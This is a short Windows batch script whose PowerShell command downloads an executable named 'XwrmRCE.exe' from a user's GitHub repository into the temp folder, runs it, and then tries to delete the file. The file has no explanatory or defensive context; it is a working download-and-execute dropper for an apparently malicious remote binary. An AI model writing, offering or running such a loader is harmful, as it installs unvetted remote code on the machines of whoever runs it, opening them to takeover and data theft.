@echo off
powershell -Command "$bytes = (Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/skiddyskid111/resources/refs/heads/main/XwrmRCE.exe' -UseBasicParsing).Content; [System.IO.File]::WriteAllBytes('$env:TEMP\XwrmRCE.exe', $bytes); Start-Process -FilePath '$env:TEMP\XwrmRCE.exe'"
del %TEMP%\XwrmRCE.exe